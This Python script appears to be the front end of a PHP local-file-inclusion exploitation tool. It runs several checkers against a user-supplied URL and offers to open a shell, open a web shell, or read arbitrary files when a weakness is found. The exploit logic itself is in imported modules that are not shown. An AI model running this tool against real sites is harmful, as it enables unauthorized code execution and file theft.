from core.PHPInputExploiter import PHPInputExploiter
from core.PHPFilterChainGenerator import PHPFilterChainGenerator
from core.DataChecker import DataChecker
from core.PHPFilterChecker import PHPFilterChecker
from core.EnvironChecker import EnvironChecker
from core.LFIChecker import LFIChecker

def test_PHPInputExploiter(url):
    checker = PHPInputExploiter(url, silent=False)
    result, param_name = checker.filter_check()
    print(f"LFI detected (PHPInputExploiter): {result}")
    if result:
        choice = input("Select an action (1: Run shell, 2: Skip): ")
        if choice == "1":
            checker.shell(param_name)

def test_PHPFilterChainGenerator(url):
    checker = PHPFilterChainGenerator(url, silent=False)
    result, param_name = checker.filter_check()
    print(f"LFI detected (PHPFilterChainGenerator): {result}")
    if result:
        choice = input("Select an action (1: Run shell, 2: Skip): ")
        if choice == "1":
            checker.shell(param_name)

def test_DataChecker(url):
    checker = DataChecker(url, silent=False)
    result, param_name = checker.data_check()
    print(f"LFI2RCE detected (DataChecker): {result}")
    if result:
        choice = input("Select an action (1: Run shell, 2: Skip): ")
        if choice == "1":
            checker.shell(param_name)

def test_PHPFilterChecker(url):
    checker = PHPFilterChecker(url, silent=False)
    result = checker.filter_check()
    print(f"LFI detected (PHPFilterChecker): {result}")
    if result:
        choice = input("Select an action (1: Exploit file, 2: Skip): ")
        if choice == "1":
            filename = input('Enter filename to display: ')
            checker.exploit(filename)

def test_EnvironChecker(url):
    checker = EnvironChecker(url, silent=False)
    output, param_name = checker.environ_check()
    if output:
        choice = input("Select an action (1: Run web shell, 2: Skip): ")
        if choice == "1":
            checker.web_shell(param_name)

def test_LFIChecker(url):
    checker = LFIChecker(url, silent=False)
    result = checker.path_traversal_checker()
    print(f"LFI detected (LFIChecker): {result}")
    if result:
        print("No specific action available for LFIChecker.")

def main():
    url = input('Enter site URL to test: ')

    test_PHPInputExploiter(url)
    test_PHPFilterChainGenerator(url)
    test_DataChecker(url)
    test_PHPFilterChecker(url)
    test_EnvironChecker(url)
    test_LFIChecker(url)

if __name__ == '__main__':
    main()
